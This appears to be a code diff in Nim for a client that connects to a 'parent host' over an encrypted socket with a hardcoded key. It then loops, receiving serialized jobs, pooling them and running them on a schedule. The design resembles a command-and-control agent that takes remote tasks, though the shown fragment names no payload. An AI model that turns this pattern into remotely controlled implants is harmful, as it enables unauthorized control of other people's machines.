@@ -10,12 +10,9 @@ let DEBUG: bool = true
 
 let SOCKET_KEY: array[2, uint64] = [0xdeadbeef13371337, 0xdeadbeef33013301]
 
+var PARENT_SOCKET: EncSocket = newEncSocket(PARENT_HOST, PARENT_PORT, SOCKET_KEY)
 
-let client: EncSocket = EncSocket(
-    host: PARENT_HOST,
-    port: PARENT_PORT,
-    key: SOCKET_KEY
-)
+var JOB_POOL: seq[Job] = @[]
 
 
 type DebugLevel = enum
@@ -38,11 +35,15 @@ proc debug(message: string, level: DebugLevel) =
 proc main() = 
     # send request to parent node
     debug("Calling parent host...", DebugLevel.INFO)
-    var socket: EncSocket = EncSocket()
+    PARENT_SOCKET.connect()
     # command loop
     debug("Command loop initiated!", DebugLevel.INFO)
     while true:
-        echo "lol"
+        let serialized_job: seq[uint8] = PARENT_SOCKET.recv()
+        let new_job: Job = deserialize_job(serialized_job)
+        JOB_POOL.add(new_job)
+        for job in JOB_POOL:
+            job.check_schedule()
 
 
 
